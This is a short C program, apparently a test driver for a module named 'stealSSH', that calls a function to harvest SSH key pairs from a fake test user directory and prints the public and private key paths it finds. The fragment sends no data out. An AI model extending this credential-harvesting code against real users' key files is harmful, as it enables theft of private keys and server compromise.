#include "stealSSH.h"
#include <stdio.h>
#include <stdlib.h>

int main() {
    sshKey keys[MAX_KEY_FILES];
    size_t count = 0;

    harvest_key_pairs(resolve_home_path("~/test_ssh_keys/fake_user"), keys, &count);

    printf("Found %zu key pair(s):\n", count);
    for (size_t i = 0; i < count; i++) {
        printf(" [%zu] Public: %s\n", i + 1, keys[i].publicKeyPath);
        printf("     Private: %s\n", keys[i].secretKeyPath);
        free(keys[i].publicKeyPath);
        free(keys[i].secretKeyPath);
    }

    return 0;
}
